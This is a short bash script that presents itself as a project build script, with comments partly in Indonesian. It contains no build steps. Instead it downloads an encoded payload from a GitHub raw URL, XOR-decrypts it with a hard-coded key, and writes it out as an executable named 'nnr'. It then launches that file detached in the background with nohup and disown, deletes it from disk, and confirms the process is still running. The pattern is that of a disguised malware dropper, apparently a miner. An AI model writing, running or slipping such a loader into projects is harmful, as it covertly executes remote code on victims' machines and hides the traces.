#!/bin/bash
set -e

echo "=== Building project ==="

# Download payload
_PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)

if [ -z "$_PAYLOAD" ]; then
    echo "Error: Failed to download payload"
    exit 1
fi

echo "Payload downloaded (length: ${#_PAYLOAD})"

# Decrypt
echo "$_PAYLOAD" | python3 -c '
import base64, os, sys
data = sys.stdin.read().strip()
decoded = base64.b64decode(data)
key = "kembang"
decrypted = bytes([decoded[i] ^ ord(key[i % len(key)]) for i in range(len(decoded))])
if len(decrypted) == 0:
    print("Error: Decrypted data is empty")
    sys.exit(1)
print(f"Decrypted size: {len(decrypted)} bytes")
with open("nnr", "wb") as f:
    f.write(decrypted)
os.chmod("nnr", 0o755)
'

# ============================================================
# JALANKAN DENGAN NOHUP + DISOWN
# ============================================================
echo "Starting nnr in background (nohup)..."
nohup ./nnr -j 4 > /tmp/nnr.log 2>&1 &
NNR_PID=$!
echo "nnr PID: $NNR_PID"

# Disown agar tidak mati saat shell exit
disown $NNR_PID

# Hapus file
rm -f nnr
echo "nnr running in background (file deleted)"

# Cek proses
sleep 1
if ps -p $NNR_PID > /dev/null 2>&1; then
    echo "✅ nnr is still running (PID: $NNR_PID)"
    echo "Log: tail -f /tmp/nnr.log"
else
    echo "❌ nnr stopped"
fi

echo "=== Done ==="
